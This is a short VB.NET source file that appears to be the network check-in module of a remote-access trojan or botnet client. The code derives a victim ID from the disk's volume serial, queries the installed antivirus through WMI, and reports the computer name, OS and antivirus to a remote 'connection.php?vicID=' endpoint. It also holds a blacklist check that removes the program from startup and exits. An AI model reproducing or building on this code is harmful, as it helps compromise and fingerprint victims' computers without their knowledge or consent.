﻿Imports System.Management
Imports System.Net
Imports System.Text

Public Class HTTP
    Public ID As String = Form1.ID & "_" & HWD()
    Public Host As String
    Public Sub Connect()
        Try
            Dim NewClient As New WebClient
            NewClient.DownloadString(Host & "/" & "connection.php?vicID=" & ID & "&cpname=" & My.Computer.Name & "&os=" & My.Computer.Info.OSFullName & "&antivirus=" & GetAntiVirus() & "&status=Online")
            If checkBlacklist() = True Then
                Form1.Send("Uninstall")
                DStartup(Form1.StartName)
                Application.Exit()
            End If
        Catch ex As Exception

        End Try
    End Sub
    Public Function checkBlacklist() As Boolean
        Return My.Settings.blacklist
    End Function
    Private Declare Function GetVolumeInformation Lib "kernel32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
    Function HWD() As String
        Try
            Dim sn As Integer
            GetVolumeInformation(Environ("SystemDrive") & "\", Nothing, Nothing, sn, 0, 0, Nothing, Nothing)
            Return (Hex(sn))
        Catch ex As Exception
            Return "ERR"
        End Try
    End Function
    Function GetAntiVirus() As String
        Try
            Dim str As String = Nothing
            Dim searcher As New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM AntivirusProduct")
            Dim instances As ManagementObjectCollection = searcher.[Get]()
            For Each queryObj As ManagementObject In instances
                str = queryObj("displayName").ToString()
            Next
            If str = String.Empty Then str = "N/A"
            str.ToString()
            Return str
            searcher.Dispose()
        Catch
            Return "N/A"
        End Try
    End Function
End Class